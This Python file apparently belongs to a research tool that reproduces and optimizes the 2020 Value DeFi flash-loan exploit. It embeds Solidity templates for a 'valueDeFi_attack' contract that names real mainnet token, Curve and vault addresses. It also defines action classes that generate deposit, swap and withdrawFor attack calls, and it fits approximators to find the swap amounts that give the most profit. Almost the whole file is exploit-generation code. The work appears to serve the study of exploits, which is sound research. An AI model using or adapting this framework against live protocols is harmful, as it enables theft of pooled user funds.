import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict
from Actions.Utils import *
from Actions.UtilsPrecision import *


class ValueDeFiAction():
    initialStates = [41202215, 108658258, 81079203, 11306867, 11321780]
    globalStates = initialStates.copy()
    # globalStates[0]: DAI liquidity
    # globalStates[1]: USDC liquidity
    # globalStates[2]: USDT liquidity
    # globalStates[3]: Value totalSupply
    # globalStates[4]: Value pool
    startStr_contract = '''// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/ValueDeFiI.sol";
// Block 11256673
// Block index 59
// Timestamp Sat, 14 Nov 2020 15:36:30 +0000
// Gas price 39 gwei
// Gas limit 4120360


contract valueDeFi_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DAIAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant ValueMultiVaultBankAddress = 0x8764f2c305b79680CfCc3398a96aedeA9260f7ff;
    address private constant ValueDefiMultiVaultAddress = 0x55BF8304C78Ba6fe47fd251F37d7beb485f86d26;
    address private constant CurveFisUSDPoolAddress = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address private constant MultiSatblesVaultAddress =  0xDdD7df28B1Fb668B77860B473aF819b03DB61101;
    address private constant Curve3crvAddress = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address private constant SushiSwapAddress = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    IERC20 DAI = IERC20(DAIAddress);
    IERC20 CRV = IERC20(Curve3crvAddress);
    IERC20 USDC = IERC20(USDCAddress);
    IERC20 USDT = IERC20(USDTAddress);
    IERC20 ValueDefiMultiVault = IERC20(ValueDefiMultiVaultAddress);
    IValueMultiVaultBank ValueMultiVaultBank = IValueMultiVaultBank(ValueMultiVaultBankAddress);
    ICurveFi CurveFi = ICurveFi(CurveFisUSDPoolAddress);
    // IMultiStablesVault MultiStablesVault  = IMultiStablesVault(MultiSatblesVaultAddress);

    IMultiStablesVault ValueMultiVault = IMultiStablesVault(ValueDefiMultiVaultAddress);

    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";
    string str5 = "";
    string str6 = "";

    string str89 = "";
    string str90 = "";
    string str91 = "";

    constructor() payable {
        DAI.approve(CurveFisUSDPoolAddress, 2**256 - 1);
        StandardToken(USDTAddress).approve(CurveFisUSDPoolAddress, 2**256 - 1);
        DAI.approve(ValueDefiMultiVaultAddress, 2**256 - 1);
        CRV.approve(CurveFisUSDPoolAddress, 2**256 - 1);
        StandardToken(USDTAddress).approve(UniswapV2Router02Address, 2**256 - 1);
        USDC.approve(CurveFisUSDPoolAddress, 2**256 - 1);
        EOA = msg.sender;
    }

    receive() external payable {}
    
    '''

    startStr_attack = '''    // flashloan amount: 116M DAI, 100M USDT
    function attack( $$_$$ ) public{

    '''

    endStr_attack = '''        revert(ProfitSummary());
    }
    '''

    endStr_contract = '''
    function ProfitSummary() internal returns (string memory _uintAsString){
        uint balance1 = USDT.balanceOf(address(this)) / 10 ** 6;
        uint balance2 = USDC.balanceOf(address(this)) / 10 ** 6;
        uint balance3 = DAI.balanceOf(address(this)) / 10 ** 18;
        uint balance4 = CRV.balanceOf(address(this)) / 10 ** 18;  // 1.02
        str89 = appendWithSpace(uint2str(balance1), uint2str(balance2));
        str90 = appendWithSpace(uint2str(balance3), uint2str(balance4));
        str90 = appendWithSpace(str89, str90);
        return str90;
    }

    function CurveBalanceSummary() internal returns (string memory _uintAsString){
        uint balance1 = CurveFi.balances(0) / 10 ** 18; // DAI
        uint balance2 = CurveFi.balances(1) / 10 ** 6; // USDC
        uint balance3 = CurveFi.balances(2) / 10 ** 6; // USDT
        str89 = append("DAI liquidity: ", uint2str(balance1));
        str90 = append(" USDC liquidity: ", uint2str(balance2));
        str91 = append(" USDT liquidity: ", uint2str(balance3));
        return append(append(str89, str90), str91);
    }

    function ValueDeFiSummary() internal returns (string memory _uintAsString) {
        uint totalSupply = ValueMultiVault.totalSupply() / 10 ** 18;
        uint _pool = ValueMultiVault.balance() / 10 ** 18;
        str89 = appendWithSpace("totalSupply: ", uint2str(totalSupply));
        str90 = appendWithSpace(" pool: ", uint2str(_pool));
        return appendWithSpace(str89, str90);
    }

    function ValueDeFiPool() internal returns (string memory _uintAsString) {
        uint _pool = ValueMultiVault.balance() / 10 ** 18;
        return appendWithSpace(" pool: ", uint2str(_pool));
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}
    '''
    
    initialBalances = {"DAI": 116000000, "USDT": 100000000}
    currentBalances = initialBalances.copy()
    TargetTokens = {'USDT', 'USDC', 'DAI', 'CRV'}
    TokenPrices = {"USDT": 1.0, "USDC": 1.0, 'DAI':1.0, 'CRV': 1.0}

    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        if stats == None or len(stats) != 4:
            return 0
        profit = stats[0] - 100000000 + stats[1] + stats[2] - 116000000 + stats[3] * 1.0
        #        USDT                   USDC       DAI                    CRV
        return profit

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit

    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)

    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)

    def initialPass():
        action1 = VaultBankDeposit
        action2 = Curve_DAI2USDC
        action3 = Curve_USDT2USDC
        action4 = ValueWithdrawFor
        action5 = Curve_USDC2USDT
        action6 = Curve_USDC2DAI
        
        action_list_1 = [action1, action2, action3, action4, action5, action6]

        action1_prestate_dependency = [action2, action3, action5, action6]
        action2_prestate_dependency = [action1, action3, action5, action6]
        action3_prestate_dependency = [action1, action2, action5, action5]
        action4_prestate_dependency = [action1, action2, action3, action5, action6]
        action5_prestate_dependency = [action1, action2, action3, action6]
        action6_prestate_dependency = [action1, action2, action3, action5]

        # seq of actions
        ActionWrapper = ValueDeFiAction
        action_lists = [action1_prestate_dependency + [action1], action2_prestate_dependency + [action2], \
                        action3_prestate_dependency + [action3], action4_prestate_dependency + [action4], \
                        action5_prestate_dependency + [action5], action6_prestate_dependency + [action6]]
                        

        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))


    def runinitialPass():
        return

class VaultBankDeposit(ValueDeFiAction):
    points = []
    values = [[], [], [], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None 
    approximator3 = None
    approximator4 = None
    approximator5 = None 


    numInputs = 1
    tokensIn = ['DAI']
    tokensOut = ['mvUSD']
    range = [0, 30000000]   # 25000000
        

    @classmethod
    def actionStr(cls):
        action = "      // Action: VaultBankDeposit\n"
        action += '''       ValueMultiVaultBank.deposit(ValueDefiMultiVaultAddress, DAIAddress, $$ * 1e18, 0, false, 0); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: VaultBankDeposit\n"
        action += '''        str1 = CurveBalanceSummary();
        str2 = ValueDeFiSummary();
        uint sharesGot = ValueMultiVault.balanceOf(address(this));
        ValueMultiVaultBank.deposit(ValueDefiMultiVaultAddress, DAIAddress, $$ * 1e18, 0, false, 0);
        sharesGot = (ValueMultiVault.balanceOf(address(this)) - sharesGot ) / 10 ** 18;
        str3 = CurveBalanceSummary();
        str4 = ValueDeFiSummary();
        revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(appendWithSpace(str3, str4), uint2str(sharesGot))));
'''
        return action

    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[5], values[6], values[7], values[8], values[9], values[10]


    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 11:
            return -1

        point = [values[0], values[1], values[2], values[3], values[4], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3, v4, v5= cls.aliquotValues(values)
        cls.values[0].append(v0)  # DAI liquidity
        cls.values[1].append(v1)  # USDC liquidity
        cls.values[2].append(v2)  # USDT liquidity
        cls.values[3].append(v3)  # totalSupply
        cls.values[4].append(v4)  # pool
        cls.values[5].append(v5)  # mvUSD got
        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])
        cls.approximator4 = NumericalApproximator(cls.points, cls.values[4])
        cls.approximator5 = NumericalApproximator(cls.points, cls.values[5])
        cls.hasNewDataPoints = False



    @classmethod
    def simulate(cls, input):
        output0 = None
        output1 = None
        output2 = None

        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[2], cls.globalStates[3], \
            cls.globalStates[4], input]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)
        output4 = cls.approximator4(inputs)
        output5 = cls.approximator5(inputs)        

        return output0, output1, output2, output3, output4, output5


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['DAI'] -= input
        output0, output1, output2, output3, output4, output5 = cls.simulate(input)


        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.globalStates[2] = output2
        cls.globalStates[3] = output3
        cls.globalStates[4] = output4

        if "mvUSD" not in cls.currentBalances:
            cls.currentBalances["mvUSD"] = output5
        else:
            cls.currentBalances["mvUSD"] += output5
        return


    @classmethod
    def string(cls):
        return cls.__name__


class Curve_DAI2USDC(ValueDeFiAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None    

    numInputs = 1
    tokensIn = ['DAI']
    tokensOut = ['USDC']
    range = [0, 100000000]   # 91000000
        

    @classmethod
    def actionStr(cls):
        action = "      // Action: Curve_DAI2USDC\n"
        action += '''       CurveFi.exchange(0, 1, $$ * 10 ** 18, 0); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: Curve_DAI2USDC\n"
        action += '''               str1 = CurveBalanceSummary();
        str2 = ValueDeFiPool();
        uint USDCgot = USDC.balanceOf(address(this));
        CurveFi.exchange(0, 1, $$ * 10 ** 18, 0);
        USDCgot = (USDC.balanceOf(address(this)) - USDCgot) / 10 ** 6;
        str3 = CurveBalanceSummary();
        str4 = ValueDeFiPool();
        revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(appendWithSpace(str3, str4), uint2str(USDCgot)))); \n'''
        return action


    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[4], values[5], values[7], values[8]


    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 9:
            return -1

        point = [values[0], values[1], values[2], values[3], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3= cls.aliquotValues(values)
        cls.values[0].append(v0)  # Curve DAI balance
        cls.values[1].append(v1)  # Curve USDC balance
        cls.values[2].append(v2)  # Pool
        cls.values[3].append(v3)  # USDCOut
        cls.hasNewDataPoints = True
        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [0,1,2,4])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0,1,2,4])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3], [0,1,2,4])

        cls.hasNewDataPoints = False



    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[2],  cls.globalStates[3], \
            input]

        new_inputs = [inputs[0], inputs[1], inputs[2], inputs[4]]
        output0 = cls.approximator0(new_inputs)
        output1 = cls.approximator1(new_inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(new_inputs)

        return output0, output1, output2, output3


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['DAI'] -= input
        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[0] += input
        cls.globalStates[1] = output1
        cls.globalStates[3] = output2

        if "USDC" not in cls.currentBalances:
            cls.currentBalances["USDC"] = output3
        else:
            cls.currentBalances["USDC"] += output3
        return


    @classmethod
    def string(cls):
        return cls.__name__



class Curve_USDT2USDC(ValueDeFiAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None    

    numInputs = 1
    tokensIn = ['USDT']
    tokensOut = ['USDC']
    range = [0, 40000000]   # 31000000
        

    @classmethod
    def actionStr(cls):
        action = "      // Action: Curve_USDT2USDC\n"
        action += '''       CurveFi.exchange(2, 1, $$ * 10 ** 6, 0); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: Curve_USDT2USDC\n"
        action += '''               str1 = CurveBalanceSummary();
        str2 = ValueDeFiPool();    
        uint USDCgot = USDC.balanceOf(address(this));
        CurveFi.exchange(2, 1, $$ * 10 ** 6, 0);
        USDCgot = (USDC.balanceOf(address(this)) - USDCgot) / 10 ** 6;
        str3 = CurveBalanceSummary();
        str4 = ValueDeFiPool();
        revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(appendWithSpace(str3, str4), uint2str(USDCgot))));\n'''
        return action


    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[5], values[6], values[7], values[8]


    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 9:
            return -1

        point = [values[0], values[1], values[2], values[3], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3= cls.aliquotValues(values)
        cls.values[0].append(v0)  # Curve USDC balance
        cls.values[1].append(v1)  # Curve USDT balance
        cls.values[2].append(v2)  # Pool
        cls.values[3].append(v3)  # USDCOut
        cls.hasNewDataPoints = True
        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [0,1,2,-1])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0,1,2,-1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3], [0,1,2,-1])

        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[2],  cls.globalStates[3], \
            input]

        new_inputs = [inputs[0], inputs[1], inputs[2], inputs[-1]]

        output0 = cls.approximator0(new_inputs)
        output1 = cls.approximator1(new_inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(new_inputs)

        return output0, output1, output2, output3


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['USDT'] -= input
        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[1] = output0
        cls.globalStates[2] += input
        cls.globalStates[4] = output2
        if "USDC" not in cls.currentBalances:
            cls.currentBalances["USDC"] = output3
        else:
            cls.currentBalances["USDC"] += output3
        return


    @classmethod
    def string(cls):
        return cls.__name__

class ValueWithdrawFor(ValueDeFiAction):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None
 

    numInputs = 1
    tokensIn = ['mvUSD']
    tokensOut = ['CRV']
    range = [0, 30000000]   # 24923203
        

    @classmethod
    def actionStr(cls):
        action = "      // Action: ValueWithdrawFor\n"
        action += '''      ValueMultiVault.withdrawFor(address(this), $$ * 10 ** 18, Curve3crvAddress, 0); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: ValueWithdrawFor\n"
        action += '''        str1 = ValueDeFiSummary();
        uint CRVgot = CRV.balanceOf(address(this));
        ValueMultiVault.withdrawFor(address(this), $$ * 10 ** 18, Curve3crvAddress, 0);
        CRVgot = (CRV.balanceOf(address(this)) - CRVgot ) / 10 ** 18;
        str2 = ValueDeFiSummary();
        revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(CRVgot)));
        '''
        return action


    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[2], values[3], values[4]


    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0], values[1], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2= cls.aliquotValues(values)
        cls.values[0].append(v0)  # totalSupply
        cls.values[1].append(v1)  # pool
        cls.values[2].append(v2)  # CRV out
        cls.hasNewDataPoints = True
        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])

        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [ cls.globalStates[3], cls.globalStates[4], \
            input]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)

        return output0, output1, output2


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['mvUSD'] -= input
        output0, output1, output2 = cls.simulate(input)

        cls.globalStates[3] -= input
        cls.globalStates[4] = output1
        if "CRV" not in cls.currentBalances:
            cls.currentBalances["CRV"] = output2
        else:
            cls.currentBalances["CRV"] += output2
        return


    @classmethod
    def string(cls):
        return cls.__name__


class Curve_USDC2USDT(ValueDeFiAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None    

    numInputs = 1
    tokensIn = ['USDC']
    tokensOut = ['USDT']
    range = [0, 20000000]   # 17331353
        

    @classmethod
    def actionStr(cls):
        action = "      // Action: Curve_USDC2USDT\n"
        action += '''      CurveFi.exchange(1, 2, $$ * 10 ** 6, 0); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: Curve_USDC2USDT\n"
        action += '''       str1 = CurveBalanceSummary();
        str2 = ValueDeFiPool();    
        uint USDTgot = USDT.balanceOf(address(this));
        CurveFi.exchange(1, 2, $$ * 10 ** 6, 0);
        USDTgot = (USDT.balanceOf(address(this)) - USDTgot) / 10 ** 6;
        str3 = CurveBalanceSummary();
        str4 = ValueDeFiPool();
        revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(appendWithSpace(str3, str4), uint2str(USDTgot))));
        '''
        return action


    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[5], values[6], values[7], values[8]


    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 9:
            return -1

        point = [values[0], values[1], values[2], values[3], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3= cls.aliquotValues(values)
        cls.values[0].append(v0)  # Curve USDC balance
        cls.values[1].append(v1)  # Curve USDT balance
        cls.values[2].append(v2)  # Pool
        cls.values[3].append(v3)  # USDCOut
        cls.hasNewDataPoints = True
        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [0,1,2,-1])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0,1,2,-1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3], [0,1,2,-1])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[2],  cls.globalStates[3], \
            input]

        new_inputs = [inputs[0], inputs[1], inputs[2], inputs[-1]]

        output0 = cls.approximator0(new_inputs)
        output1 = cls.approximator1(new_inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(new_inputs)

        return output0, output1, output2, output3


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['USDC'] -= input
        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[1] += input
        cls.globalStates[2] = output1
        cls.globalStates[4] = output2
        cls.currentBalances["USDT"] += output3
        return


    @classmethod
    def string(cls):
        return cls.__name__


class Curve_USDC2DAI(ValueDeFiAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True

    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None  

    numInputs = 1
    tokensIn = ['USDC']
    tokensOut = ['DAI']
    range = [0, 100000000]   # 90285002
        

    @classmethod
    def actionStr(cls):
        action = "      // Action: Curve_USDC2DAI\n"
        action += '''       CurveFi.exchange(1, 0, $$ * 10 ** 6, 0); \n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: Curve_USDC2DAI\n"
        action += '''        str1 = CurveBalanceSummary();
        str2 = ValueDeFiPool();    
        uint DAIgot = DAI.balanceOf(address(this));
        CurveFi.exchange(1, 0, $$ * 10 ** 6, 0);
        DAIgot = (DAI.balanceOf(address(this)) - DAIgot) / 10 ** 18;
        str3 = CurveBalanceSummary();
        str4 = ValueDeFiPool();
        revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(appendWithSpace(str3, str4), uint2str(DAIgot))));\n
        '''
        return action


    @classmethod
    def aliquotValues(cls, values):
        # print(values)
        return values[4], values[5], values[7], values[8]


    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 9:
            return -1

        point = [values[0], values[1], values[2], values[3], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3= cls.aliquotValues(values)
        cls.values[0].append(v0)  # Curve DAI balance
        cls.values[1].append(v1)  # Curve USDC balance
        cls.values[2].append(v2)  # Pool
        cls.values[3].append(v3)  # DAIOut
        cls.hasNewDataPoints = True
        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0], [0,1,2,-1])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1], [0,1,2,-1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3], [0,1,2,-1])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], \
            cls.globalStates[2],  cls.globalStates[3], \
            input]

        new_inputs = [inputs[0], inputs[1], inputs[2], inputs[-1]]
        output0 = cls.approximator0(new_inputs)
        output1 = cls.approximator1(new_inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(new_inputs)

        return output0, output1, output2, output3


    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['USDC'] -= input
        output0, output1, output2, output3 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] += input
        cls.globalStates[4] = output2
        cls.currentBalances["DAI"] += output3
        return

    @classmethod
    def string(cls):
        return cls.__name__


def main():

    # config.method
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 0
    config.ETHorBSCorDVDorFantom = 0
    config.initialEther = 1000000
    config.blockNum = 11256673
    config.contract_name = "valueDeFi_attack"

    
# Test for initial pass of data collecton: 
    ValueDeFiAction.initialPass()
    # ValueDeFiAction.runinitialPass()

    # action1 = VaultBankDeposit
    # action2 = Curve_DAI2USDC
    # action3 = Curve_USDT2USDC
    # action4 = ValueWithdrawFor
    # action5 = Curve_USDC2USDT
    # action6 = Curve_USDC2DAI


    # action_list = [action1, action2, action3, action4, action5, action6]
    # initial_guess = [25000000, 91000000, 31000000, 24923203, 17331353, 90285002]


    # ActionWrapper = ValueDeFiAction

    # # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))
    # actual_profit = 7956221.0
    # print("actual profit: ", actual_profit)
    # e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
    # return actual_profit, e1, e2, e3, e4




if __name__ == "__main__":
    main()
    